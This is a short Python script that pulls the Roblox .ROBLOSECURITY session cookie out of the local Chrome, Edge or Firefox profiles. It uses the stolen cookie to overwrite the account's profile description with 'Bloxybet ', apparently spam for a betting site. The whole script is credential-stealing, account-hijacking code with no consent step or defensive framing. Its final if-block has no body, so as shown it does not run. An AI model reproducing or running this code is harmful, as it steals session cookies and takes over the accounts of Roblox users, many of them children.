import os
import browser_cookie3
import requests

NEW_DESCRIPTION = "Bloxybet "

def get_roblox_cookie_from_browser():
    try:
        # Tries Chrome first, falls back to Edge/Firefox if locked
        for loader in [browser_cookie3.chrome, browser_cookie3.edge, browser_cookie3.firefox]:
            try:
                cj = loader(domain_name="roblox.com")
                for cookie in cj:
                    if cookie.name == ".ROBLOSECURITY":
                        return cookie.value
            except Exception:
                continue
    except Exception as e:
        print(f"[-] Browser profile access restricted: {e}")
    return None

roblox_cookie = get_roblox_cookie_from_browser()

if not roblox_cookie:
    exit(1)

session = requests.Session()
session.cookies.set(".ROBLOSECURITY", roblox_cookie, domain=".roblox.com")

def get_csrf_token():
    response = session.post("https://auth.roblox.com/v2/login")
    return response.headers.get("x-csrf-token")

csrf_token = get_csrf_token()

url = "https://users.roblox.com/v1/description"
headers = {
    "X-CSRF-Token": csrf_token,
    "Content-Type": "application/json",
    "Referer": "https://www.roblox.com/"
}
payload = {
    "description": NEW_DESCRIPTION
}

response = session.post(url, headers=headers, json=payload)

if response.status_code == 200:
else:
    print(response.text)
